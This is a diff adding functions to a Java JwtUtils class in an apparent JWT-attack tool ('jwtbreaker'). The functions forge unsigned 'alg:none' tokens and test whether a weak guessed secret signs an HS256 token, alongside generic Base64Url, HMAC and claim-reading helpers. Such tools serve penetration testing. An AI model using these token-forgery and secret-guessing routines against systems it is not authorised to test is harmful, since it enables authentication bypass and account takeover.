@@ -1,7 +1,10 @@
 package com.jwtbreaker;
 
+import com.fasterxml.jackson.databind.JsonNode;
 import com.fasterxml.jackson.databind.ObjectMapper;
 
+import javax.crypto.Mac;
+import javax.crypto.spec.SecretKeySpec;
 import java.nio.charset.StandardCharsets;
 import java.util.Base64;
 import java.util.regex.Pattern;
@@ -76,6 +79,81 @@ public final class JwtUtils {
                 headerJson,
                 payloadJson,
                 signature);
+    }
+
+    private static final Base64.Encoder URL_ENCODER = Base64.getUrlEncoder().withoutPadding();
+
+    /** Base64Url-encodes bytes without padding (JWT style). */
+    public static String base64Url(byte[] data) {
+        return URL_ENCODER.encodeToString(data);
+    }
+
+    /** Base64Url-encodes a UTF-8 string without padding. */
+    public static String base64Url(String text) {
+        return base64Url(text.getBytes(StandardCharsets.UTF_8));
+    }
+
+    /**
+     * Builds an "alg:none" token from an existing payload. Header is forced to
+     * {"alg":"none","typ":"JWT"} and the signature is left empty.
+     */
+    public static String generateAlgNoneToken(String payloadRawJson) {
+        String header = "{\"alg\":\"none\",\"typ\":\"JWT\"}";
+        return base64Url(header) + "." + base64Url(payloadRawJson) + ".";
+    }
+
+    /** Computes the Base64Url HMAC-SHA256 signature of the signing input. */
+    public static String hmacSha256(String signingInput, String secret) {
+        try {
+            Mac mac = Mac.getInstance("HmacSHA256");
+            mac.init(new SecretKeySpec(secret.getBytes(StandardCharsets.UTF_8), "HmacSHA256"));
+            byte[] sig = mac.doFinal(signingInput.getBytes(StandardCharsets.UTF_8));
+            return base64Url(sig);
+        } catch (Exception e) {
+            throw new RuntimeException("HMAC error: " + e.getMessage(), e);
+        }
+    }
+
+    /**
+     * True if the given secret correctly signs this HS256 token, i.e. the token
+     * is signed with that weak secret.
+     */
+    public static boolean verifyHs256(String token, String secret) {
+        String[] parts = token.split("\\.", -1);
+        if (parts.length < 3 || parts[2].isEmpty()) {
+            return false;
+        }
+        String signingInput = parts[0] + "." + parts[1];
+        String expected = hmacSha256(signingInput, secret);
+        return constantTimeEquals(expected, parts[2]);
+    }
+
+    private static boolean constantTimeEquals(String a, String b) {
+        if (a.length() != b.length()) {
+            return false;
+        }
+        int result = 0;
+        for (int i = 0; i < a.length(); i++) {
+            result |= a.charAt(i) ^ b.charAt(i);
+        }
+        return result == 0;
+    }
+
+    /**
+     * Reads the "exp" claim (epoch seconds) from a payload JSON string.
+     * Returns null if there is no exp claim.
+     */
+    public static Long readExp(String payloadJson) {
+        try {
+            JsonNode root = MAPPER.readTree(payloadJson);
+            JsonNode exp = root.get("exp");
+            if (exp == null || exp.isNull()) {
+                return null;
+            }
+            return exp.asLong();
+        } catch (Exception e) {
+            return null;
+        }
     }
 
     /** Holder for a decoded JWT. */
